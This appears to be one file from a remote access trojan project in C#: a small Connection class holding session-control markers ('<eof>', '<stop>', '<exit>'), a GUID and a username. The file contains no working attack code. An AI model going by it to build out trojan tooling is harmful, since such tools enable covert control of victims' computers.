using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace Company.Tools.RemoteAccessTrojan.Domain.Seedwork
{
    public class Connection
    {
        public const string EOF = "<eof>";
        public const string STOP = "<stop>";
        public const string EXIT = "<exit>";
        
        public Guid Identifier { get; set; }
        public string Username { get; set; }

        internal static Connection Parse(string data)
        {
            var connection = new Connection()
            {
                Identifier = Guid.NewGuid(),
                Username = data
            };
            return connection;
        }
    }
}